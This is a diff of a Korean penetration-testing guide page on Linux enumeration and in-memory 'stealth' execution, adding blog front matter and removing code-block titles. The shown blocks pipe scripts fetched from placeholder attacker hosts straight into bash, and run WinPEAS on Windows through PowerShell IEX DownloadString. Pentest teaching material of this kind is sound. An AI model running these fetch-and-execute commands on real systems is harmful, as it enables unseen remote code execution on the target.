@@ -1,4 +1,11 @@
-
+---
+layout: page
+title: Linux_Automated_Enum
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
 # Linux 자동화 정보 수집 및 스텔스 실행 가이드
 
@@ -49,17 +56,17 @@ https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e
 
 #### **실행 예시**
 
-```bash title="hello.sh"
+```bash
 # hello.sh 내용
 echo "Hello! This script was executed directly from memory."
 ```
 
-```bash title="공격자: 웹 서버 실행"
+```bash
 # 공격자 머신(Kali)에 hello.sh를 위치시킨 후, 웹 서버를 실행
 python3 -m http.server 80
 ```
 
-```bash(title="타겟: LinPEAS 인메모리 실행")
+```bash
 # 타겟 시스템에서 curl을 이용해 스크립트를 다운로드하고, 그 내용을 파이프로 bash에 전달하여 바로 실행
 curl -s http://<attacker_ip>/hello.sh | bash
 ```
@@ -68,13 +75,13 @@ curl -s http://<attacker_ip>/hello.sh | bash
 
 실제 침투 테스트 상황에서는 권한 상승 정보 수집 스크립트인 `LinPEAS`(리눅스용)나 `WinPEAS`(윈도우용)를 실행할 때 이 기법이 널리 사용됩니다.
 
-```bash title="Linux (LinPEAS 실행)"
+```bash
 # 공격자의 웹 서버에서 LinPEAS 스크립트를 받아 바로 실행
 curl -s http://attacker-server.com/linpeas.sh | bash
 ```
 
 
-```powershell title="Windows (WinPEAS 실행"
+```powershell
 # PowerShell을 이용해 원격 스크립트를 다운로드하고 메모리에서 실행
 # 윈도우에서는 bash 대신 PowerShell의 IEX (Invoke-Expression)를 사용하는 것이 일반적입니다. 원리는 동일합니다.
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker-server.com/winpeas.ps1')"
